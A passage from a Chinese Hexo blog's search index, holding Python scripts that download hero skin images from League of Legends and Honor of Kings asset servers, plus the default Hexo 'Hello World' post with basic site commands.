LOL.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\✩\˚\*\•̩̩͙ʚ]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&#x27;<span class="subst">&#123;name+title&#125;</span>\\&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line">newname = change_name(skin_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+newname+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"><span class="built_in">print</span>(skin_name)</span><br><span class="line"></span><br><span class="line">hero_list_url = <span class="string">&quot;https://game.gtimg.cn/images/lol/act/img/js/heroList/hero_list.js?ts=2748291&quot;</span></span><br><span class="line">response = requests.get(url=hero_list_url,headers=headers)</span><br><span class="line">hero_list = response.json()[<span class="string">&#x27;hero&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> hero_list:</span><br><span class="line">hero_id = hero[<span class="string">&#x27;heroId&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">hero_url = <span class="string">f&quot;https://game.gtimg.cn/images/lol/act/img/js/hero/<span class="subst">&#123;hero_id&#125;</span>.js&quot;</span></span><br><span class="line">response_1 = requests.get(url=hero_url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(hero_id,hero_name,hero_title)</span><br><span class="line">skin_list = response_1.json()[<span class="string">&#x27;skins&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> skin <span class="keyword">in</span> skin_list:</span><br><span class="line"><span class="keyword">if</span>(skin[<span class="string">&#x27;mainImg&#x27;</span>]):</span><br><span class="line">skin_url = skin[<span class="string">&#x27;mainImg&#x27;</span>]</span><br><span class="line">skin_name = skin[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="comment"># print(skin_url)</span></span><br></pre></td></tr></table></figure><p>各个英雄的皮肤会保存在自己的文件下：</p><p><img src="https://s2.loli.net/2022/04/06/LEcIVRNbux1rnDA.png" alt="image-20220406084813906.png"></p><p><img src="https://s2.loli.net/2022/04/06/R4XxZkbLVtwQcHe.png" alt="image-20220406084841993.png"></p><h4 id="王者荣耀英雄皮肤爬取"><a href="#王者荣耀英雄皮肤爬取" class="headerlink" title="王者荣耀英雄皮肤爬取"></a>王者荣耀英雄皮肤爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wzry.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\✩\˚\*\•̩̩͙ʚ]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&quot;<span class="subst">&#123;title+name&#125;</span>\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+skin_name+<span class="string">&#x27;_&#x27;</span>+name+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">herolist_url = <span class="string">&quot;https://pvp.qq.com/web201605/js/herolist.json&quot;</span></span><br><span class="line">herolist = requests.get(url=herolist_url,headers=headers).json()</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> herolist:</span><br><span class="line">hero_ename = hero[<span class="string">&#x27;ename&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;cname&#x27;</span>]</span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(hero_ename,hero[<span class="string">&#x27;cname&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;skin_name&#x27;</span> <span class="keyword">in</span> hero):</span><br><span class="line">skin_list = hero[<span class="string">&#x27;skin_name&#x27;</span>].split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">hero_url = <span class="string">f&quot;https://pvp.qq.com/web201605/herodetail/<span class="subst">&#123;hero_ename&#125;</span>.shtml&quot;</span></span><br><span class="line">response = requests.get(url=hero_url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">tu = re.findall(<span class="string">&#x27;&lt;ul class=\&quot;pic-pf-list pic-pf-list3\&quot; data-imgname=\&quot;(.*?)\&amp;0\|(.*?)\&amp;0\|(.*?)\&amp;72\&quot;&gt;&#x27;</span>,response.text)</span><br><span class="line">skin_list = <span class="built_in">list</span>(tu[<span class="number">0</span>])</span><br><span class="line">skin_lens = <span class="built_in">len</span>(skin_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(skin_lens):</span><br><span class="line">skin_url = <span class="string">f&quot;https://game.gtimg.cn/images/yxzj/img201606/heroimg/<span class="subst">&#123;hero_ename&#125;</span>/<span class="subst">&#123;hero_ename&#125;</span>-bigskin-<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.jpg&quot;</span></span><br><span class="line">skin_name = skin_list[i]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="built_in">print</span>(skin_name,hero_name)</span><br></pre></td></tr></table></figure><p>文件保存思路与LOL一致：</p><p><img src="https://s2.loli.net/2022/04/06/qpJTLrSeatgcbKk.png" alt="image-20220406085029196.png"></p><p><img src="https://s2.loli.net/2022/04/06/6RMvwCJk37HqOfi.png" alt="image-20220406085046682.png"></p><h4 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h4>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/05/hello-world/"/>
      <url>/2022/04/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test1 </tag>
            
            <tag> test2 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
